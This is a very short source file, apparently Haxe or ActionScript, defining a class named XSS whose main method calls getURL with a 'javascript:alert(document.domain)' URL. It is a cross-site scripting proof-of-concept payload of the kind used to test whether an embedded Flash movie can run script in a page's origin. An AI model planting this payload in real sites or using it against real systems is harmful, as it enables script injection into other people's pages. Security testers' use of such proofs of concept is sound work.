class XSS {
    public static function main() {
        trace('xss');
        getURL('javascript:alert(document.domain)');
    }
}